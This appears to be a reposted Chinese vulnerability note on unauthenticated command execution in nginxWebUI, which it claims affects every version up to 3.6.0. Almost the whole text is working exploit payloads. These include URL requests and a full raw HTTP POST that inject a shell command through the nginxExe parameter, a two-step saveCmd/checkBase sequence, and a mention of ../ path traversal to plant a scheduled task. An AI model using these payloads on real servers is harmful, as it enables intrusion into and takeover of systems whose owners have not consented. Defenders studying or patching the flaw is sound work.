nginxWebUI < 3.5.2 未授权命令执行漏洞（网上公开为3.5.0 但下载后发现作者已删除GITEE中3.5.0的相应代码，下载3.5.0版本jar包反编译后发现并没有对权限绕过进行修复） nginxWebUI 全版本均存在命令执行漏洞(文章截止最新版3.6.0)
1.payload（命令执行1）:
http://localhost:8080/AdminPage/conf/reload?nginxExe=calc%20%7C
2:payload（命令执行2）:
POST /AdminPage/conf/check HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 151
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: chrome-extension://ieoejemkppmjcdfbnfphhpbfmallhfnc
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SOLONID=1788f71299dc4608a355ff347bf429fa
Connection: close

nginxExe=calc%20%7C&json=%7B%22nginxContent%22%3A%22TES%22%2C%22subContent%22%3A%5B%22A%22%5D%2C%22subName%22%3A%5B%22A%22%5D%7D&nginxPath=C%3A%5CUsers

3.payload:
//第一步设置属性
http://localhost:8080/AdminPage/conf/saveCmd?nginxExe=calc%20%7c&nginxPath=a&nginxDir=a
//第二步执行命令
http://localhost:8080/AdminPage/conf/checkBase
可通过../ 控制文件上传路径，上传计划任务

(来源：白给信安)https://mp.weixin.qq.com/s/oKsR7bm3tleJIS675Qt0RA